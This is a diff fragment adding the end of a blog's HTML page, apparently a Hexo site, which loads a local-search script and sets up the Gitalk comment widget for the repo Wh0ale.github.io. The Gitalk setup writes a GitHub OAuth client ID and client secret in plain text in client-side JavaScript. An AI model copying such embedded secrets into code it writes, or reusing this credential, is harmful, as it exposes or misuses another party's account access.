+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
